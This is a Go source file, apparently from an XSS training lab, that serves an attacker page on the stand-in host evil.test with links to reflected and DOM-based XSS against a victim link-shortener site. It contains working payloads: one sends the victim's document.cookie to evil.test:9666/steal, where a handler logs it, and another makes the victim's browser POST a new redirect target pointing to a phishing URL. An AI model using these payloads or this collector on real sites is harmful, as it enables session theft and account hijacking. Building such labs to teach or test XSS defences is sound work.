package main

import (
	"html/template"
	"log"
	"net/http"
	"net/url"
)

const collector = "http://evil.test:9666"

// Two payloads. steal sends the cookie to the attacker; ride never touches the
// cookie and instead makes alice's own browser change where /a1 points.
const (
	stealPayload = `<img src=x onerror="new Image().src='` + collector + `/steal?c='+encodeURIComponent(document.cookie)">`
	ridePayload  = `<img src=x onerror="fetch('/settings/target',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'url='+encodeURIComponent('` + collector + `/phish')})">`
)

var attackTmpl = template.Must(template.New("attack").Parse(`<!doctype html>
<meta charset="utf-8"><title>免費領取短網址流量報告</title>
<p><a href="{{.Reflected}}">攻擊 A：反射型，偷 Cookie</a></p>
<p><a href="{{.Ride}}">攻擊 B：反射型，借 alice 的身分改 /a1</a></p>
<p><a href="{{.DOM}}">攻擊 C：DOM 型，偷 Cookie</a></p>
`))

// attackPage serves the evil.test side: a page of crafted links, plus /steal
// where a stolen cookie lands. Stored XSS needs no page; see main.go's hint.
func attackPage(victim string, logger *log.Logger) http.Handler {
	mux := http.NewServeMux()
	mux.HandleFunc("GET /steal", func(w http.ResponseWriter, r *http.Request) {
		logger.Printf("收到偷來的 Cookie：%q", r.URL.Query().Get("c"))
		w.WriteHeader(http.StatusNoContent)
	})
	mux.HandleFunc("GET /{$}", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		err := attackTmpl.Execute(w, map[string]string{
			"Reflected": victim + "/search?q=" + url.QueryEscape(stealPayload),
			"Ride":      victim + "/search?q=" + url.QueryEscape(ridePayload),
			// The fragment never reaches the server: only the victim's own JS reads it.
			"DOM": victim + "/preview#" + url.PathEscape(stealPayload),
		})
		if err != nil {
			logger.Printf("render attack page: %v", err)
		}
	})
	return mux
}
